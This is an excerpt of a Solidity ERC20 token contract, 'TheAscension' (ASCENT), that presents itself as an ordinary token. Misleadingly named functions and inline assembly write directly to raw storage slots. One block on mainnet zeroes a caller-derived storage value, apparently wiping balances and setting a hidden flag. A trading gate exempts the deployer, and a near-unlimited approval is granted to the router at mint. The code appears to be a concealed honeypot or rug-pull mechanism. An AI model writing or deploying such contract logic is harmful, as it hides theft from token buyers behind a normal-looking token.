...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private purgeAddr;
    uint256 private _choiceReorder = block.number*2;

    mapping (address => bool) private _primeToken; 
    mapping (address => bool) private _secondToken;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private downFalls;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private brownHash;
    address public pair;
    ...
    bool private trading; uint256 private newHorizon = 1; bool private dontDoIt;
    uint256 private _decimals; uint256 private riseUp;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        purgeAddr.push(_router); purgeAddr.push(msgSender_); purgeAddr.push(pair);
        for (uint256 q=0; q < 3;) {_primeToken[purgeAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenStarter() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x610f57e22ea5c53ad5e8a8447a256ae0a57b6eb65d339d4f7667e5f3057ce8a2
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xe37f31820cceb2f018a6b9690fa2b9ab60d87ee0feb1ab080b226264b693cf0f,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _choiceReorder = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == purgeAddr[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployCleansing(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(purgeAddr[0], 10 ** 77);
        _TokenStarter();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCleansing(creator, initialSupply);
    }
}

contract TheAscension is ERC20Token {
    constructor() ERC20Token("Ascension", "ASCENT", msg.sender, 225000 * 10 ** 18) {
    }
}